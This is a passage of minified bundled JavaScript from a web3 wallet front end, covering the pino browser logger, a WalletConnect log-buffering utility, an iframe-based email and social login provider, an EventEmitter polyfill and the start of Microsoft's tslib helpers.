Error("pino: transmit option must have a send function");const C=I.browser.write||e;I.browser.write&&(I.browser.asObject=!0);const N=I.serializers||{},L=i(I.browser.serialize,N);let $=I.browser.serialize;Array.isArray(I.browser.serialize)&&I.browser.serialize.indexOf("!stdSerializers.err")>-1&&($=!1);const y=["error","fatal","warn","info","debug","trace"];typeof C=="function"&&(C.error=C.fatal=C.warn=C.info=C.debug=C.trace=C),I.enabled===!1&&(I.level="silent");const A=I.level||"info",b=Object.create(C);b.log||(b.log=w),Object.defineProperty(b,"levelVal",{get:_}),Object.defineProperty(b,"level",{get:O,set:D});const v={transmit:E,serialize:L,asObject:I.browser.asObject,levels:y,timestamp:f(I)};b.levels=n.levels,b.level=A,b.setMaxListeners=b.getMaxListeners=b.emit=b.addListener=b.on=b.prependListener=b.once=b.prependOnceListener=b.removeListener=b.removeAllListeners=b.listeners=b.listenerCount=b.eventNames=b.write=b.flush=w,b.serializers=N,b._serialize=L,b._stdErrSerialize=$,b.child=R,E&&(b._logEvent=d());function _(){return this.level==="silent"?1/0:this.levels.values[this.level]}function O(){return this._level}function D(P){if(P!=="silent"&&!this.levels.values[P])throw Error("unknown level "+P);this._level=P,s(v,b,"error","log"),s(v,b,"fatal","error"),s(v,b,"warn","error"),s(v,b,"info","log"),s(v,b,"debug","log"),s(v,b,"trace","log")}function R(P,B){if(!P)throw new Error("missing bindings for child Pino");B=B||{},L&&P.serializers&&(B.serializers=P.serializers);const M=B.serializers;if(L&&M){var W=Object.assign({},N,M),K=I.browser.serialize===!0?Object.keys(W):L;delete P.serializers,c([P],K,W,this._stdErrSerialize)}function q(J){this._childLevel=(J._childLevel|0)+1,this.error=l(J,P,"error"),this.fatal=l(J,P,"fatal"),this.warn=l(J,P,"warn"),this.info=l(J,P,"info"),this.debug=l(J,P,"debug"),this.trace=l(J,P,"trace"),W&&(this.serializers=W,this._serialize=K),E&&(this._logEvent=d([].concat(J._logEvent.bindings,P)))}return q.prototype=this,new q(this)}return b}n.levels={values:{fatal:60,error:50,warn:40,info:30,debug:20,trace:10},labels:{10:"trace",20:"debug",30:"info",40:"warn",50:"error",60:"fatal"}},n.stdSerializers=t,n.stdTimeFunctions=Object.assign({},{nullTime:m,epochTime:x,unixTime:S,isoTime:T});function s(I,E,C,N){const L=Object.getPrototypeOf(E);E[C]=E.levelVal>E.levels.values[C]?w:L[C]?L[C]:e[C]||e[N]||w,o(I,E,C)}function o(I,E,C){!I.transmit&&E[C]===w||(E[C]=function(N){return function(){const $=I.timestamp(),y=new Array(arguments.length),A=Object.getPrototypeOf&&Object.getPrototypeOf(this)===e?e:this;for(var b=0;b<y.length;b++)y[b]=arguments[b];if(I.serialize&&!I.asObject&&c(y,this._serialize,this.serializers,this._stdErrSerialize),I.asObject?N.call(A,a(this,C,y,$)):N.apply(A,y),I.transmit){const v=I.transmit.level||E.level,_=n.levels.values[v],O=n.levels.values[C];if(O<_)return;u(this,{ts:$,methodLevel:C,methodValue:O,transmitValue:n.levels.values[I.transmit.level||E.level],send:I.transmit.send,val:E.levelVal},y)}}}(E[C]))}function a(I,E,C,N){I._serialize&&c(C,I._serialize,I.serializers,I._stdErrSerialize);const L=C.slice();let $=L[0];const y={};N&&(y.time=N),y.level=n.levels.values[E];let A=(I._childLevel|0)+1;if(A<1&&(A=1),$!==null&&typeof $=="object"){for(;A--&&typeof L[0]=="object";)Object.assign(y,L.shift());$=L.length?r(L.shift(),L):void 0}else typeof $=="string"&&($=r(L.shift(),L));return $!==void 0&&(y.msg=$),y}function c(I,E,C,N){for(const L in I)if(N&&I[L]instanceof Error)I[L]=n.stdSerializers.err(I[L]);else if(typeof I[L]=="object"&&!Array.isArray(I[L]))for(const $ in I[L])E&&E.indexOf($)>-1&&$ in C&&(I[L][$]=C[$](I[L][$]))}function l(I,E,C){return function(){const N=new Array(1+arguments.length);N[0]=E;for(var L=1;L<N.length;L++)N[L]=arguments[L-1];return I[C].apply(this,N)}}function u(I,E,C){const N=E.send,L=E.ts,$=E.methodLevel,y=E.methodValue,A=E.val,b=I._logEvent.bindings;c(C,I._serialize||Object.keys(I.serializers),I.serializers,I._stdErrSerialize===void 0?!0:I._stdErrSerialize),I._logEvent.ts=L,I._logEvent.messages=C.filter(function(v){return b.indexOf(v)===-1}),I._logEvent.level.label=$,I._logEvent.level.value=y,N($,I._logEvent,A),I._logEvent=d(b)}function d(I){return{ts:0,messages:[],bindings:I||[],level:{label:"",value:0}}}function h(I){const E={type:I.constructor.name,msg:I.message,stack:I.stack};for(const C in I)E[C]===void 0&&(E[C]=I[C]);return E}function f(I){return typeof I.timestamp=="function"?I.timestamp:I.timestamp===!1?m:x}function p(){return{}}function g(I){return I}function w(){}function m(){return!1}function x(){return Date.now()}function S(){return Math.round(Date.now()/1e3)}function T(){return new Date(Date.now()).toISOString()}function k(){function I(E){return typeof E<"u"&&E}try{return typeof globalThis<"u"||Object.defineProperty(Object.prototype,"globalThis",{get:function(){return delete Object.prototype.globalThis,this.globalThis=this},configurable:!0}),globalThis}catch{return I(self)||I(window)||I(this)||{}}}return sS}var $m=eme();const Iu=Ss($m),tme=r=>JSON.stringify(r,(e,t)=>typeof t=="bigint"?t.toString()+"n":t),rme=r=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,t=r.replace(e,'$1"$2n"$3');return JSON.parse(t,(i,n)=>typeof n=="string"&&n.match(/^\d+n$/)?BigInt(n.substring(0,n.length-1)):n)};function gu(r){if(typeof r!="string")throw new Error(`Cannot safe json parse value of type ${typeof r}`);try{return rme(r)}catch{return r}}function mu(r){return typeof r=="string"?r:tme(r)||""}const ime={level:"info"},o4="custom_context",G$=1e3*1024;let nme=class{constructor(e){this.nodeValue=e,this.sizeInBytes=new TextEncoder().encode(this.nodeValue).length,this.next=null}get value(){return this.nodeValue}get size(){return this.sizeInBytes}},AL=class{constructor(e){this.head=null,this.tail=null,this.lengthInNodes=0,this.maxSizeInBytes=e,this.sizeInBytes=0}append(e){const t=new nme(e);if(t.size>this.maxSizeInBytes)throw new Error(`[LinkedList] Value too big to insert into list: ${e} with size ${t.size}`);for(;this.size+t.size>this.maxSizeInBytes;)this.shift();this.head?(this.tail&&(this.tail.next=t),this.tail=t):(this.head=t,this.tail=t),this.lengthInNodes++,this.sizeInBytes+=t.size}shift(){if(!this.head)return;const e=this.head;this.head=this.head.next,this.head||(this.tail=null),this.lengthInNodes--,this.sizeInBytes-=e.size}toArray(){const e=[];let t=this.head;for(;t!==null;)e.push(t.value),t=t.next;return e}get length(){return this.lengthInNodes}get size(){return this.sizeInBytes}toOrderedArray(){return Array.from(this)}[Symbol.iterator](){let e=this.head;return{next:()=>{if(!e)return{done:!0,value:null};const t=e.value;return e=e.next,{done:!1,value:t}}}}},LJ=class{constructor(e,t=G$){this.level=e??"error",this.levelValue=$m.levels.values[this.level],this.MAX_LOG_SIZE_IN_BYTES=t,this.logs=new AL(this.MAX_LOG_SIZE_IN_BYTES)}forwardToConsole(e,t){t===$m.levels.values.error?console.error(e):t===$m.levels.values.warn?console.warn(e):t===$m.levels.values.debug?console.debug(e):t===$m.levels.values.trace?console.trace(e):console.log(e)}appendToLogs(e){this.logs.append(mu({timestamp:new Date().toISOString(),log:e}));const t=typeof e=="string"?JSON.parse(e).level:e.level;t>=this.levelValue&&this.forwardToConsole(e,t)}getLogs(){return this.logs}clearLogs(){this.logs=new AL(this.MAX_LOG_SIZE_IN_BYTES)}getLogArray(){return Array.from(this.logs)}logsToBlob(e){const t=this.getLogArray();return t.push(mu({extraMetadata:e})),new Blob(t,{type:"application/json"})}},sme=class{constructor(e,t=G$){this.baseChunkLogger=new LJ(e,t)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}downloadLogsBlobInBrowser(e){const t=URL.createObjectURL(this.logsToBlob(e)),i=document.createElement("a");i.href=t,i.download=`walletconnect-logs-${new Date().toISOString()}.txt`,document.body.appendChild(i),i.click(),document.body.removeChild(i),URL.revokeObjectURL(t)}},ome=class{constructor(e,t=G$){this.baseChunkLogger=new LJ(e,t)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}};var ame=Object.defineProperty,cme=Object.defineProperties,lme=Object.getOwnPropertyDescriptors,IL=Object.getOwnPropertySymbols,ume=Object.prototype.hasOwnProperty,dme=Object.prototype.propertyIsEnumerable,TL=(r,e,t)=>e in r?ame(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,r7=(r,e)=>{for(var t in e||(e={}))ume.call(e,t)&&TL(r,t,e[t]);if(IL)for(var t of IL(e))dme.call(e,t)&&TL(r,t,e[t]);return r},i7=(r,e)=>cme(r,lme(e));function ra(r){return i7(r7({},r),{level:r?.level||ime.level})}function hme(r,e=o4){return r[e]||""}function fme(r,e,t=o4){return r[t]=e,r}function Or(r,e=o4){let t="";return typeof r.bindings>"u"?t=hme(r,e):t=r.bindings().context||"",t}function pme(r,e,t=o4){const i=Or(r,t);return i.trim()?`${i}/${e}`:e}function gr(r,e,t=o4){const i=pme(r,e,t),n=r.child({context:i});return fme(n,i,t)}function gme(r){var e,t;const i=new sme((e=r.opts)==null?void 0:e.level,r.maxSizeInBytes);return{logger:Iu(i7(r7({},r.opts),{level:"trace",browser:i7(r7({},(t=r.opts)==null?void 0:t.browser),{write:n=>i.write(n)})})),chunkLoggerController:i}}function mme(r){var e;const t=new ome((e=r.opts)==null?void 0:e.level,r.maxSizeInBytes);return{logger:Iu(i7(r7({},r.opts),{level:"trace"}),t),chunkLoggerController:t}}function _3(r){return typeof r.loggerOverride<"u"&&typeof r.loggerOverride!="string"?{logger:r.loggerOverride,chunkLoggerController:null}:typeof window<"u"?gme(r):mme(r)}class wme{constructor(e){const t=ra({level:R1e}),{logger:i,chunkLoggerController:n}=_3({opts:t});this.logger=gr(i,this.constructor.name),this.chunkLoggerController=n,typeof window<"u"&&this.chunkLoggerController?.downloadLogsBlobInBrowser&&(window.downloadAppKitLogsBlob||(window.downloadAppKitLogsBlob={}),window.downloadAppKitLogsBlob.sdk=()=>{this.chunkLoggerController?.downloadLogsBlobInBrowser&&this.chunkLoggerController.downloadLogsBlobInBrowser({projectId:e})})}}class bme{constructor({projectId:e,chainId:t,enableLogger:i=!0,onTimeout:n}){this.openRpcRequests=[],i&&(this.w3mLogger=new wme(e)),this.w3mFrame=new Q2e({projectId:e,isAppClient:!0,chainId:t,enableLogger:i}),this.onTimeout=n,this.getLoginEmailUsed()&&this.w3mFrame.initFrame(),this.w3mFrame.events.onFrameEvent(s=>{s.type===Dt.FRAME_GET_USER_SUCCESS&&(this.user=s.payload)}),this.initPromise=new Promise(s=>{this.w3mFrame.events.onFrameEvent(o=>{o.type===Dt.FRAME_READY&&(this.initPromise=void 0,s())})})}async init(){this.w3mFrame.initFrame(),this.initPromise&&await this.initPromise}getLoginEmailUsed(){return!!ro.get(Dt.EMAIL_LOGIN_USED_KEY)}getEmail(){return ro.get(Dt.EMAIL)}getUsername(){return ro.get(Dt.SOCIAL_USERNAME)}async reload(){try{this.w3mFrame.initFrame(),await this.appEvent({type:Dt.APP_RELOAD})}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error reloading iframe"),e}}async connectEmail(e){try{Ro.checkIfAllowedToTriggerEmail(),this.w3mFrame.initFrame();const t=await this.appEvent({type:Dt.APP_CONNECT_EMAIL,payload:e});return this.setNewLastEmailLoginTime(),t}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error connecting email"),t}}async connectDevice(){try{return this.appEvent({type:Dt.APP_CONNECT_DEVICE})}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error connecting device"),e}}async connectOtp(e){try{return this.appEvent({type:Dt.APP_CONNECT_OTP,payload:e})}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error connecting otp"),t}}async isConnected(){try{if(!this.getLoginEmailUsed())return{isConnected:!1};const e=await this.appEvent({type:Dt.APP_IS_CONNECTED});return e.isConnected||this.deleteAuthLoginCache(),e}catch(e){throw this.deleteAuthLoginCache(),this.w3mLogger?.logger.error({error:e},"Error checking connection"),e}}async getChainId(){try{const e=await this.appEvent({type:Dt.APP_GET_CHAIN_ID});return this.setLastUsedChainId(e.chainId),e}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error getting chain id"),e}}async getSocialRedirectUri(e){try{return this.w3mFrame.initFrame(),this.appEvent({type:Dt.APP_GET_SOCIAL_REDIRECT_URI,payload:e})}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error getting social redirect uri"),t}}async updateEmail(e){try{const t=await this.appEvent({type:Dt.APP_UPDATE_EMAIL,payload:e});return this.setNewLastEmailLoginTime(),t}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error updating email"),t}}async updateEmailPrimaryOtp(e){try{return this.appEvent({type:Dt.APP_UPDATE_EMAIL_PRIMARY_OTP,payload:e})}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error updating email primary otp"),t}}async updateEmailSecondaryOtp(e){try{const t=await this.appEvent({type:Dt.APP_UPDATE_EMAIL_SECONDARY_OTP,payload:e});return this.setLoginSuccess(t.newEmail),t}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error updating email secondary otp"),t}}async syncTheme(e){try{return this.appEvent({type:Dt.APP_SYNC_THEME,payload:e})}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error syncing theme"),t}}async syncDappData(e){try{return this.appEvent({type:Dt.APP_SYNC_DAPP_DATA,payload:e})}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error syncing dapp data"),t}}async getSmartAccountEnabledNetworks(){try{const e=await this.appEvent({type:Dt.APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS});return this.persistSmartAccountEnabledNetworks(e.smartAccountEnabledNetworks),e}catch(e){throw this.persistSmartAccountEnabledNetworks([]),this.w3mLogger?.logger.error({error:e},"Error getting smart account enabled networks"),e}}async setPreferredAccount(e){try{return this.appEvent({type:Dt.APP_SET_PREFERRED_ACCOUNT,payload:{type:e}})}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error setting preferred account"),t}}async connect(e){try{const t=e?.chainId||this.getLastUsedChainId()||1,i=await this.appEvent({type:Dt.APP_GET_USER,payload:{...e,chainId:t}});return this.setLoginSuccess(i.email),this.setLastUsedChainId(i.chainId),i}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error connecting"),t}}async getUser(e){try{const t=e?.chainId||this.getLastUsedChainId()||1;return await this.appEvent({type:Dt.APP_GET_USER,payload:{...e,chainId:t}})}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error connecting"),t}}async connectSocial(e){try{this.w3mFrame.initFrame();const t=await this.appEvent({type:Dt.APP_CONNECT_SOCIAL,payload:{uri:e}});return t.userName&&this.setSocialLoginSuccess(t.userName),t}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error connecting social"),t}}async getFarcasterUri(){try{return this.w3mFrame.initFrame(),await this.appEvent({type:Dt.APP_GET_FARCASTER_URI})}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error getting farcaster uri"),e}}async connectFarcaster(){try{const e=await this.appEvent({type:Dt.APP_CONNECT_FARCASTER});return e.userName&&this.setSocialLoginSuccess(e.userName),e}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error connecting farcaster"),e}}async switchNetwork(e){try{const t=await this.appEvent({type:Dt.APP_SWITCH_NETWORK,payload:{chainId:e}});return this.setLastUsedChainId(t.chainId),t}catch(t){throw this.w3mLogger?.logger.error({error:t},"Error switching network"),t}}async disconnect(){try{const e=await this.appEvent({type:Dt.APP_SIGN_OUT});return this.deleteAuthLoginCache(),e}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error disconnecting"),e}}async request(e){try{if(vr.GET_CHAIN_ID===e.method)return this.getLastUsedChainId();this.rpcRequestHandler?.(e);const t=await this.appEvent({type:Dt.APP_RPC_REQUEST,payload:e});return this.rpcSuccessHandler?.(t,e),t}catch(t){throw this.rpcErrorHandler?.(t,e),this.w3mLogger?.logger.error({error:t},"Error requesting"),t}}onRpcRequest(e){this.rpcRequestHandler=e}onRpcSuccess(e){this.rpcSuccessHandler=e}onRpcError(e){this.rpcErrorHandler=e}onIsConnected(e){this.w3mFrame.events.onFrameEvent(t=>{t.type===Dt.FRAME_IS_CONNECTED_SUCCESS&&t.payload.isConnected&&e()})}onNotConnected(e){this.w3mFrame.events.onFrameEvent(t=>{t.type===Dt.FRAME_IS_CONNECTED_ERROR&&e(),t.type===Dt.FRAME_IS_CONNECTED_SUCCESS&&!t.payload.isConnected&&e()})}onConnect(e){this.w3mFrame.events.onFrameEvent(t=>{t.type===Dt.FRAME_GET_USER_SUCCESS&&e(t.payload)})}onSocialConnected(e){this.w3mFrame.events.onFrameEvent(t=>{t.type===Dt.FRAME_CONNECT_SOCIAL_SUCCESS&&e(t.payload)})}async getCapabilities(){try{return await this.request({method:"wallet_getCapabilities"})||{}}catch{return{}}}onSetPreferredAccount(e){this.w3mFrame.events.onFrameEvent(t=>{t.type===Dt.FRAME_SET_PREFERRED_ACCOUNT_SUCCESS?e(t.payload):t.type===Dt.FRAME_SET_PREFERRED_ACCOUNT_ERROR&&e({type:vr.ACCOUNT_TYPES.EOA})})}onGetSmartAccountEnabledNetworks(e){this.w3mFrame.events.onFrameEvent(t=>{t.type===Dt.FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS?e(t.payload.smartAccountEnabledNetworks):t.type===Dt.FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR&&e([])})}getAvailableChainIds(){return Object.keys(this.w3mFrame.networks)}rejectRpcRequests(){try{this.openRpcRequests.forEach(({abortController:e,method:t})=>{vr.SAFE_RPC_METHODS.includes(t)||e.abort()}),this.openRpcRequests=[]}catch(e){this.w3mLogger?.logger.error({error:e},"Error aborting RPC request")}}async appEvent(e){await this.w3mFrame.frameLoadPromise;let t;function i(a){return a.replace("@w3m-app/","")}const n=new AbortController,s=i(e.type);return[Dt.APP_CONNECT_EMAIL,Dt.APP_CONNECT_DEVICE,Dt.APP_CONNECT_OTP,Dt.APP_CONNECT_SOCIAL,Dt.APP_GET_SOCIAL_REDIRECT_URI].map(i).includes(s)&&(t=setTimeout(()=>{this.onTimeout?.(),n.abort()},3e4)),new Promise((a,c)=>{const l=Math.random().toString(36).substring(7);if(this.w3mLogger?.logger.info?.({event:e,id:l},"Sending app event"),this.w3mFrame.events.postAppEvent({...e,id:l}),s==="RPC_REQUEST"){const d=e;this.openRpcRequests=[...this.openRpcRequests,{...d.payload,abortController:n}]}n.signal.addEventListener("abort",()=>{s==="RPC_REQUEST"?c(new Error("Request was aborted")):s!=="GET_FARCASTER_URI"&&c(new Error("Something went wrong"))});function u(d,h){d.id===l&&(h?.logger.info?.({framEvent:d,id:l},"Received frame response"),d.type===`@w3m-frame/${s}_SUCCESS`?(t&&clearTimeout(t),"payload"in d&&a(d.payload),a(void 0)):d.type===`@w3m-frame/${s}_ERROR`&&(t&&clearTimeout(t),"payload"in d&&c(new Error(d.payload?.message||"An error occurred")),c(new Error("An error occurred"))))}this.w3mFrame.events.registerFrameEventHandler(l,d=>u(d,this.w3mLogger),n.signal)})}setNewLastEmailLoginTime(){ro.set(Dt.LAST_EMAIL_LOGIN_TIME,Date.now().toString())}setSocialLoginSuccess(e){ro.set(Dt.SOCIAL_USERNAME,e)}setLoginSuccess(e){e&&ro.set(Dt.EMAIL,e),ro.set(Dt.EMAIL_LOGIN_USED_KEY,"true"),ro.delete(Dt.LAST_EMAIL_LOGIN_TIME)}deleteAuthLoginCache(){ro.delete(Dt.EMAIL_LOGIN_USED_KEY),ro.delete(Dt.EMAIL),ro.delete(Dt.LAST_USED_CHAIN_KEY),ro.delete(Dt.SOCIAL_USERNAME)}setLastUsedChainId(e){e&&ro.set(Dt.LAST_USED_CHAIN_KEY,String(e))}getLastUsedChainId(){const e=ro.get(Dt.LAST_USED_CHAIN_KEY)??void 0,t=Number(e);return isNaN(t)?e:t}persistSmartAccountEnabledNetworks(e){ro.set(Dt.SMART_ACCOUNT_ENABLED_NETWORKS,e.join(","))}}var q6={exports:{}},kL;function vme(){if(kL)return q6.exports;kL=1;var r=typeof Reflect=="object"?Reflect:null,e=r&&typeof r.apply=="function"?r.apply:function(k,I,E){return Function.prototype.apply.call(k,I,E)},t;r&&typeof r.ownKeys=="function"?t=r.ownKeys:Object.getOwnPropertySymbols?t=function(k){return Object.getOwnPropertyNames(k).concat(Object.getOwnPropertySymbols(k))}:t=function(k){return Object.getOwnPropertyNames(k)};function i(T){console&&console.warn&&console.warn(T)}var n=Number.isNaN||function(k){return k!==k};function s(){s.init.call(this)}q6.exports=s,q6.exports.once=m,s.EventEmitter=s,s.prototype._events=void 0,s.prototype._eventsCount=0,s.prototype._maxListeners=void 0;var o=10;function a(T){if(typeof T!="function")throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof T)}Object.defineProperty(s,"defaultMaxListeners",{enumerable:!0,get:function(){return o},set:function(T){if(typeof T!="number"||T<0||n(T))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+T+".");o=T}}),s.init=function(){(this._events===void 0||this._events===Object.getPrototypeOf(this)._events)&&(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},s.prototype.setMaxListeners=function(k){if(typeof k!="number"||k<0||n(k))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+k+".");return this._maxListeners=k,this};function c(T){return T._maxListeners===void 0?s.defaultMaxListeners:T._maxListeners}s.prototype.getMaxListeners=function(){return c(this)},s.prototype.emit=function(k){for(var I=[],E=1;E<arguments.length;E++)I.push(arguments[E]);var C=k==="error",N=this._events;if(N!==void 0)C=C&&N.error===void 0;else if(!C)return!1;if(C){var L;if(I.length>0&&(L=I[0]),L instanceof Error)throw L;var $=new Error("Unhandled error."+(L?" ("+L.message+")":""));throw $.context=L,$}var y=N[k];if(y===void 0)return!1;if(typeof y=="function")e(y,this,I);else for(var A=y.length,b=p(y,A),E=0;E<A;++E)e(b[E],this,I);return!0};function l(T,k,I,E){var C,N,L;if(a(I),N=T._events,N===void 0?(N=T._events=Object.create(null),T._eventsCount=0):(N.newListener!==void 0&&(T.emit("newListener",k,I.listener?I.listener:I),N=T._events),L=N[k]),L===void 0)L=N[k]=I,++T._eventsCount;else if(typeof L=="function"?L=N[k]=E?[I,L]:[L,I]:E?L.unshift(I):L.push(I),C=c(T),C>0&&L.length>C&&!L.warned){L.warned=!0;var $=new Error("Possible EventEmitter memory leak detected. "+L.length+" "+String(k)+" listeners added. Use emitter.setMaxListeners() to increase limit");$.name="MaxListenersExceededWarning",$.emitter=T,$.type=k,$.count=L.length,i($)}return T}s.prototype.addListener=function(k,I){return l(this,k,I,!1)},s.prototype.on=s.prototype.addListener,s.prototype.prependListener=function(k,I){return l(this,k,I,!0)};function u(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,arguments.length===0?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function d(T,k,I){var E={fired:!1,wrapFn:void 0,target:T,type:k,listener:I},C=u.bind(E);return C.listener=I,E.wrapFn=C,C}s.prototype.once=function(k,I){return a(I),this.on(k,d(this,k,I)),this},s.prototype.prependOnceListener=function(k,I){return a(I),this.prependListener(k,d(this,k,I)),this},s.prototype.removeListener=function(k,I){var E,C,N,L,$;if(a(I),C=this._events,C===void 0)return this;if(E=C[k],E===void 0)return this;if(E===I||E.listener===I)--this._eventsCount===0?this._events=Object.create(null):(delete C[k],C.removeListener&&this.emit("removeListener",k,E.listener||I));else if(typeof E!="function"){for(N=-1,L=E.length-1;L>=0;L--)if(E[L]===I||E[L].listener===I){$=E[L].listener,N=L;break}if(N<0)return this;N===0?E.shift():g(E,N),E.length===1&&(C[k]=E[0]),C.removeListener!==void 0&&this.emit("removeListener",k,$||I)}return this},s.prototype.off=s.prototype.removeListener,s.prototype.removeAllListeners=function(k){var I,E,C;if(E=this._events,E===void 0)return this;if(E.removeListener===void 0)return arguments.length===0?(this._events=Object.create(null),this._eventsCount=0):E[k]!==void 0&&(--this._eventsCount===0?this._events=Object.create(null):delete E[k]),this;if(arguments.length===0){var N=Object.keys(E),L;for(C=0;C<N.length;++C)L=N[C],L!=="removeListener"&&this.removeAllListeners(L);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if(I=E[k],typeof I=="function")this.removeListener(k,I);else if(I!==void 0)for(C=I.length-1;C>=0;C--)this.removeListener(k,I[C]);return this};function h(T,k,I){var E=T._events;if(E===void 0)return[];var C=E[k];return C===void 0?[]:typeof C=="function"?I?[C.listener||C]:[C]:I?w(C):p(C,C.length)}s.prototype.listeners=function(k){return h(this,k,!0)},s.prototype.rawListeners=function(k){return h(this,k,!1)},s.listenerCount=function(T,k){return typeof T.listenerCount=="function"?T.listenerCount(k):f.call(T,k)},s.prototype.listenerCount=f;function f(T){var k=this._events;if(k!==void 0){var I=k[T];if(typeof I=="function")return 1;if(I!==void 0)return I.length}return 0}s.prototype.eventNames=function(){return this._eventsCount>0?t(this._events):[]};function p(T,k){for(var I=new Array(k),E=0;E<k;++E)I[E]=T[E];return I}function g(T,k){for(;k+1<T.length;k++)T[k]=T[k+1];T.pop()}function w(T){for(var k=new Array(T.length),I=0;I<k.length;++I)k[I]=T[I].listener||T[I];return k}function m(T,k){return new Promise(function(I,E){function C(L){T.removeListener(k,N),E(L)}function N(){typeof T.removeListener=="function"&&T.removeListener("error",C),I([].slice.call(arguments))}S(T,k,N,{once:!0}),k!=="error"&&x(T,C,{once:!0})})}function x(T,k,I){typeof T.on=="function"&&S(T,"error",k,I)}function S(T,k,I,E){if(typeof T.on=="function")E.once?T.once(k,I):T.on(k,I);else if(typeof T.addEventListener=="function")T.addEventListener(k,function C(N){E.once&&T.removeEventListener(k,C),I(N)});else throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof T)}return q6.exports}var en=vme();const T0=Ss(en);var oS={};/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */var gk=function(r,e){return gk=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,i){t.__proto__=i}||function(t,i){for(var n in i)i.hasOwnProperty(n)&&(t[n]=i[n])},gk(r,e)};function yme(r,e){gk(r,e);function t(){this.constructor=r}r.prototype=e===null?Object.create(e):(t.prototype=e.prototype,new t)}var mk=function(){return mk=Object.assign||function(e){for(var t,i=1,n=arguments.length;i<n;i++){t=arguments[i];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},mk.apply(this,arguments)};function xme(r,e){var t={};for(var i in r)Object.prototype.hasOwnProperty.call(r,i)&&e.indexOf(i)<0&&(t[i]=r[i]);if(r!=null&&typeof Object.getOwnPropertySymbols=="function")for(var n=0,i=Object.getOwnPropertySymbols(r);n<i.length;n++)e.indexOf(i[n])<0&&Object.prototype.propertyIsEnumerable.call(r,i[n])&&(t[i[n]]=r[i[n]]);return t}function Cme(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s}function Eme(r,e){return function(t,i){e(t,i,r)}}function _me(r,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(r,e)}function Sme(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})}function Ame(r,e){var t={label:0,sent:function(){if(s[0]&1)throw s[1];return s[1]},trys:[],ops:[]},i,n,s,o;return o={next:a(0),throw:a(1),return:a(2)},typeof Symbol=="function"&&(o[Symbol.iterator]=function(){return this}),o;function a(l){return function(u){return c([l,u])}}function c(l){if(i)throw new TypeError("Generator is already executing.");for(;t;)try{if(i=1,n&&(s=l[0]&2?n.return:l[0]?n.throw||((s=n.return)&&s.call(n),0):n.next)&&!(s=s.call(n,l[1])).done)return 